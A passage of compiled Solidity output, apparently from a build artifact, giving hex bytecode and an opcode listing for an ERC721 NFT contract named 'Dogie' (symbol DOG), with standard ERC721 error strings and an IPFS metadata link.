6040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cbc90611d57565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610d35576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d2c90611d97565b60405180910390fd5b610d4283838360016111ae565b8273ffffffffffffffffffffffffffffffffffffffff16610d6282610685565b73ffffffffffffffffffffffffffffffffffffffff1614610db8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610daf90611d57565b60405180910390fd5b6004600082815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055506001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a4610f4483838360016112d4565b505050565b60006002600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610ff5576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610fec90611db7565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31836040516110e69190611cda565b60405180910390a3505050565b6110fe848484610c4f565b61110a848484846112da565b611149576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161114090611d37565b60405180910390fd5b50505050565b611169828260405180602001604052806000815250611471565b5050565b60008073ffffffffffffffffffffffffffffffffffffffff1661118f83610f49565b73ffffffffffffffffffffffffffffffffffffffff1614159050919050565b60018111156112ce57600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16146112425780600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461123a9190611f96565b925050819055505b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146112cd5780600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546112c59190611f40565b925050819055505b5b50505050565b50505050565b60006112fb8473ffffffffffffffffffffffffffffffffffffffff166114cc565b15611464578373ffffffffffffffffffffffffffffffffffffffff1663150b7a02611324610af9565b8786866040518563ffffffff1660e01b81526004016113469493929190611c8e565b602060405180830381600087803b15801561136057600080fd5b505af192505050801561139157506040513d601f19601f8201168201806040525081019061138e91906119d6565b60015b611414573d80600081146113c1576040519150601f19603f3d011682016040523d82523d6000602084013e6113c6565b606091505b5060008151141561140c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161140390611d37565b60405180910390fd5b805181602001fd5b63150b7a0260e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614915050611469565b600190505b949350505050565b61147b83836114ef565b61148860008484846112da565b6114c7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114be90611d37565b60405180910390fd5b505050565b6000808273ffffffffffffffffffffffffffffffffffffffff163b119050919050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561155f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161155690611df7565b60405180910390fd5b6115688161116d565b156115a8576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161159f90611d77565b60405180910390fd5b6115b66000838360016111ae565b6115bf8161116d565b156115ff576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115f690611d77565b60405180910390fd5b6001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a46117096000838360016112d4565b5050565b600061172061171b84611ed7565b611eb2565b90508281526020810184848401111561173c5761173b612175565b5b61174784828561203e565b509392505050565b60008135905061175e816124b1565b92915050565b600081359050611773816124c8565b92915050565b600081359050611788816124df565b92915050565b60008151905061179d816124df565b92915050565b600082601f8301126117b8576117b7612170565b5b81356117c884826020860161170d565b91505092915050565b6000813590506117e0816124f6565b92915050565b6000602082840312156117fc576117fb61217f565b5b600061180a8482850161174f565b91505092915050565b6000806040838503121561182a5761182961217f565b5b60006118388582860161174f565b92505060206118498582860161174f565b9150509250929050565b60008060006060848603121561186c5761186b61217f565b5b600061187a8682870161174f565b935050602061188b8682870161174f565b925050604061189c868287016117d1565b9150509250925092565b600080600080608085870312156118c0576118bf61217f565b5b60006118ce8782880161174f565b94505060206118df8782880161174f565b93505060406118f0878288016117d1565b925050606085013567ffffffffffffffff8111156119115761191061217a565b5b61191d878288016117a3565b91505092959194509250565b600080604083850312156119405761193f61217f565b5b600061194e8582860161174f565b925050602061195f85828601611764565b9150509250929050565b600080604083850312156119805761197f61217f565b5b600061198e8582860161174f565b925050602061199f858286016117d1565b9150509250929050565b6000602082840312156119bf576119be61217f565b5b60006119cd84828501611779565b91505092915050565b6000602082840312156119ec576119eb61217f565b5b60006119fa8482850161178e565b91505092915050565b600060208284031215611a1957611a1861217f565b5b6000611a27848285016117d1565b91505092915050565b611a3981611fca565b82525050565b611a4881611fdc565b82525050565b6000611a5982611f08565b611a638185611f1e565b9350611a7381856020860161204d565b611a7c81612184565b840191505092915050565b6000611a9282611f13565b611a9c8185611f2f565b9350611aac81856020860161204d565b611ab581612184565b840191505092915050565b6000611acd602d83611f2f565b9150611ad882612195565b604082019050919050565b6000611af0603283611f2f565b9150611afb826121e4565b604082019050919050565b6000611b13602583611f2f565b9150611b1e82612233565b604082019050919050565b6000611b36601c83611f2f565b9150611b4182612282565b602082019050919050565b6000611b59602483611f2f565b9150611b64826122ab565b604082019050919050565b6000611b7c601983611f2f565b9150611b87826122fa565b602082019050919050565b6000611b9f602983611f2f565b9150611baa82612323565b604082019050919050565b6000611bc2602083611f2f565b9150611bcd82612372565b602082019050919050565b6000611be5601883611f2f565b9150611bf08261239b565b602082019050919050565b6000611c08602183611f2f565b9150611c13826123c4565b604082019050919050565b6000611c2b603d83611f2f565b9150611c3682612413565b604082019050919050565b6000611c4e603083611f2f565b9150611c5982612462565b604082019050919050565b611c6d81612034565b82525050565b6000602082019050611c886000830184611a30565b92915050565b6000608082019050611ca36000830187611a30565b611cb06020830186611a30565b611cbd6040830185611c64565b8181036060830152611ccf8184611a4e565b905095945050505050565b6000602082019050611cef6000830184611a3f565b92915050565b60006020820190508181036000830152611d0f8184611a87565b905092915050565b60006020820190508181036000830152611d3081611ac0565b9050919050565b60006020820190508181036000830152611d5081611ae3565b9050919050565b60006020820190508181036000830152611d7081611b06565b9050919050565b60006020820190508181036000830152611d9081611b29565b9050919050565b60006020820190508181036000830152611db081611b4c565b9050919050565b60006020820190508181036000830152611dd081611b6f565b9050919050565b60006020820190508181036000830152611df081611b92565b9050919050565b60006020820190508181036000830152611e1081611bb5565b9050919050565b60006020820190508181036000830152611e3081611bd8565b9050919050565b60006020820190508181036000830152611e5081611bfb565b9050919050565b60006020820190508181036000830152611e7081611c1e565b9050919050565b60006020820190508181036000830152611e9081611c41565b9050919050565b6000602082019050611eac6000830184611c64565b92915050565b6000611ebc611ecd565b9050611ec882826120b2565b919050565b6000604051905090565b600067ffffffffffffffff821115611ef257611ef1612141565b5b611efb82612184565b9050602081019050919050565b600081519050919050565b600081519050919050565b600082825260208201905092915050565b600082825260208201905092915050565b6000611f4b82612034565b9150611f5683612034565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611f8b57611f8a6120e3565b5b828201905092915050565b6000611fa182612034565b9150611fac83612034565b925082821015611fbf57611fbe6120e3565b5b828203905092915050565b6000611fd582612014565b9050919050565b60008115159050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b82818337600083830152505050565b60005b8381101561206b578082015181840152602081019050612050565b8381111561207a576000848401525b50505050565b6000600282049050600182168061209857607f821691505b602082108114156120ac576120ab612112565b5b50919050565b6120bb82612184565b810181811067ffffffffffffffff821117156120da576120d9612141565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6560008201527f72206f7220617070726f76656400000000000000000000000000000000000000602082015250565b7f4552433732313a207472616e7366657220746f206e6f6e20455243373231526560008201527f63656976657220696d706c656d656e7465720000000000000000000000000000602082015250565b7f4552433732313a207472616e736665722066726f6d20696e636f72726563742060008201527f6f776e6572000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20746f6b656e20616c7265616479206d696e74656400000000600082015250565b7f4552433732313a207472616e7366657220746f20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b7f4552433732313a2061646472657373207a65726f206973206e6f74206120766160008201527f6c6964206f776e65720000000000000000000000000000000000000000000000602082015250565b7f4552433732313a206d696e7420746f20746865207a65726f2061646472657373600082015250565b7f4552433732313a20696e76616c696420746f6b656e2049440000000000000000600082015250565b7f4552433732313a20617070726f76616c20746f2063757272656e74206f776e6560008201527f7200000000000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f60008201527f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000602082015250565b7f455243373231204d657461646174613a2055524920717565727920666f72206e60008201527f6f6e6578697374656e7420746f6b656e00000000000000000000000000000000602082015250565b6124ba81611fca565b81146124c557600080fd5b50565b6124d181611fdc565b81146124dc57600080fd5b50565b6124e881611fe8565b81146124f357600080fd5b50565b6124ff81612034565b811461250a57600080fd5b5056fe697066733a2f2f62616679626569673337696f6972373673376d67356f6f6265746e636f6a636d3363336878617379643472766964346a71687934676b61686567342f3f66696c656e616d653d302d5055472e6a736f6ea264697066735822122034b9c4568f1230b8068ba9a889c6157a30591e0e253fb57b890cfe09b3cc565164736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x446F676965000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x444F470000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x96 SWAP3 SWAP2 SWAP1 PUSH3 0xC0 JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xAF SWAP3 SWAP2 SWAP1 PUSH3 0xC0 JUMP JUMPDEST POP POP POP PUSH1 0x0 PUSH1 0x6 DUP2 SWAP1 SSTORE POP PUSH3 0x1D5 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH3 0xCE SWAP1 PUSH3 0x170 JUMP JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH3 0xF2 JUMPI PUSH1 0x0 DUP6 SSTORE PUSH3 0x13E JUMP JUMPDEST DUP3 PUSH1 0x1F LT PUSH3 0x10D JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x13E JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x13E JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x13D JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x120 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x14D SWAP2 SWAP1 PUSH3 0x151 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x16C JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x152 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH3 0x189 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH3 0x1A0 JUMPI PUSH3 0x19F PUSH3 0x1A6 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x259A DUP1 PUSH3 0x1E5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x100 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x70A08231 GT PUSH2 0x97 JUMPI DUP1 PUSH4 0xB88D4FDE GT PUSH2 0x66 JUMPI DUP1 PUSH4 0xB88D4FDE EQ PUSH2 0x2AD JUMPI DUP1 PUSH4 0xC2229FEA EQ PUSH2 0x2C9 JUMPI DUP1 PUSH4 0xC87B56DD EQ PUSH2 0x2D3 JUMPI DUP1 PUSH4 0xE985E9C5 EQ PUSH2 0x303 JUMPI PUSH2 0x100 JUMP JUMPDEST DUP1 PUSH4 0x70A08231 EQ PUSH2 0x225 JUMPI DUP1 PUSH4 0x78CE9035 EQ PUSH2 0x255 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x273 JUMPI DUP1 PUSH4 0xA22CB465 EQ PUSH2 0x291 JUMPI PUSH2 0x100 JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xD3 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x19F JUMPI DUP1 PUSH4 0x42842E0E EQ PUSH2 0x1BB JUMPI DUP1 PUSH4 0x6352211E EQ PUSH2 0x1D7 JUMPI DUP1 PUSH4 0x6E02007D EQ PUSH2 0x207 JUMPI PUSH2 0x100 JUMP JUMPDEST DUP1 PUSH4 0x1FFC9A7 EQ PUSH2 0x105 JUMPI DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x135 JUMPI DUP1 PUSH4 0x81812FC EQ PUSH2 0x153 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x183 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x11F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x11A SWAP2 SWAP1 PUSH2 0x19A9 JUMP JUMPDEST PUSH2 0x333 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x12C SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x13D PUSH2 0x415 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x14A SWAP2 SWAP1 PUSH2 0x1CF5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x16D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x168 SWAP2 SWAP1 PUSH2 0x1A03 JUMP JUMPDEST PUSH2 0x4A7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17A SWAP2 SWAP1 PUSH2 0x1C73 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x198 SWAP2 SWAP1 PUSH2 0x1969 JUMP JUMPDEST PUSH2 0x4ED JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B9 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1B4 SWAP2 SWAP1 PUSH2 0x1853 JUMP JUMPDEST PUSH2 0x605 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1D5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1D0 SWAP2 SWAP1 PUSH2 0x1853 JUMP JUMPDEST PUSH2 0x665 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1F1 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1EC SWAP2 SWAP1 PUSH2 0x1A03 JUMP JUMPDEST PUSH2 0x685 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FE SWAP2 SWAP1 PUSH2 0x1C73 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x20F PUSH2 0x70C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x21C SWAP2 SWAP1 PUSH2 0x1E97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x23F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x23A SWAP2 SWAP1 PUSH2 0x17E6 JUMP JUMPDEST PUSH2 0x716 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x24C SWAP2 SWAP1 PUSH2 0x1E97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x25D PUSH2 0x7CE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x26A SWAP2 SWAP1 PUSH2 0x1CF5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x27B PUSH2 0x7EA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x288 SWAP2 SWAP1 PUSH2 0x1CF5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2A6 SWAP2 SWAP1 PUSH2 0x1929 JUMP JUMPDEST PUSH2 0x87C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2C7 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2C2 SWAP2 SWAP1 PUSH2 0x18A6 JUMP JUMPDEST PUSH2 0x892 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2D1 PUSH2 0x8F4 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2ED PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x2E8 SWAP2 SWAP1 PUSH2 0x1A03 JUMP JUMPDEST PUSH2 0x946 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2FA SWAP2 SWAP1 PUSH2 0x1CF5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x31D PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x318 SWAP2 SWAP1 PUSH2 0x1813 JUMP JUMPDEST PUSH2 0x9B0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x32A SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH32 0x80AC58CD00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ DUP1 PUSH2 0x3FE JUMPI POP PUSH32 0x5B5E139F00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ JUMPDEST DUP1 PUSH2 0x40E JUMPI POP PUSH2 0x40D DUP3 PUSH2 0xA44 JUMP JUMPDEST JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD PUSH2 0x424 SWAP1 PUSH2 0x2080 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x450 SWAP1 PUSH2 0x2080 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x49D JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x472 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x49D JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x480 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4B2 DUP3 PUSH2 0xAAE JUMP JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4F8 DUP3 PUSH2 0x685 JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x569 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x560 SWAP1 PUSH2 0x1E37 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x588 PUSH2 0xAF9 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0x5B7 JUMPI POP PUSH2 0x5B6 DUP2 PUSH2 0x5B1 PUSH2 0xAF9 JUMP JUMPDEST PUSH2 0x9B0 JUMP JUMPDEST JUMPDEST PUSH2 0x5F6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5ED SWAP1 PUSH2 0x1E57 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x600 DUP4 DUP4 PUSH2 0xB01 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x616 PUSH2 0x610 PUSH2 0xAF9 JUMP JUMPDEST DUP3 PUSH2 0xBBA JUMP JUMPDEST PUSH2 0x655 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x64C SWAP1 PUSH2 0x1D17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x660 DUP4 DUP4 DUP4 PUSH2 0xC4F JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x680 DUP4 DUP4 DUP4 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x892 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x691 DUP4 PUSH2 0xF49 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x703 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x6FA SWAP1 PUSH2 0x1E17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x6 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x787 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x77E SWAP1 PUSH2 0x1DD7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x3 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x80 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x57 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x250E PUSH1 0x57 SWAP2 CODECOPY DUP2 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x1 DUP1 SLOAD PUSH2 0x7F9 SWAP1 PUSH2 0x2080 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 